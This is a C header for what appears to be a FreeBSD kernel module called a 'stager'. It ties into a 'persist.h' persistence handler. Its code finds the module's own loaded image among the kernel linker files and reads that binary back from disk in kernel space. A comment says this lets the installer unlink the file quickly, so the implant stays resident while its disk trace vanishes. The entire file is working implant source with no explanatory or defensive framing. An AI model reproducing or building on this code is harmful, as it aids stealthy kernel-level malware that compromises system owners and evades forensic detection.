#ifndef STAGER_SELF_H
#define STAGER_SELF_H

#include <sys/param.h>
#include <sys/types.h>
#include <sys/linker.h>
#include <sys/malloc.h>
#include <sys/proc.h>
#include <sys/uio.h>
#include <sys/fcntl.h>
#include <sys/syscallsubr.h>
#include <sys/systm.h>
#include <sys/libkern.h>

#include "persist.h"

struct selfarg {
	linker_file_t lf;
};

// find linker_file where it matches stager
// great name from me
static
int selfpred (linker_file_t lf, void* arg)
{
	struct selfarg * a = arg;

	if ((caddr_t)(uintptr_t)persist_handler>=lf->address && (caddr_t)(uintptr_t)persist_handler<lf->address+lf->size) {
		a->lf = lf;
		return (1);
	}
	return (0);
}

// walk files and return ourselves
static
linker_file_t find_self (void)
{
	struct selfarg a = { NULL };

	linker_file_foreach(selfpred, &a);
	return (a.lf);
}

// ok read from disk before we clean up
static
int read_self (linker_file_t lf, void** bufp, size* lenp)
{
	if (lf==NULL||lf->pathname==NULL)
		return (ENOENT);

	struct thread * td = curthread;
	// 1<<20
	size len = 1<<20;
	void* buf = malloc(len, M_TEMP, M_WAITOK);

	// just to be sure, we do it in kernelspace so install can unlink the file as fast as possible
	int error = kern_openat(td, AT_FDCWD, lf->pathname, UIO_SYSSPACE, O_RDONLY, 0);

	if (error != 0) {
		free(buf, M_TEMP);
		return (error);
	}

	int fd = td->td_retval[0];
	struct iovec iov = { .iov_base = buf, .iov_len = len };
	struct uio uio = {
		.uio_iov = &iov,
		.uio_iovcnt = 1,
		.uio_offset = 0,
		.uio_resid = len,
		.uio_segflg = UIO_SYSSPACE,
		.uio_rw = UIO_READ,
		.uio_td = td
	};

	error = kern_preadv(td, fd, &uio, 0);
	kern_close(td, fd);
	if (error!=0||uio.uio_resid==len) {
		free(buf, M_TEMP);
		return (error!=0 ? error : EINVAL);
	}

	*bufp = buf;
	*lenp = len-uio.uio_resid;
	return (0);
}

#endif
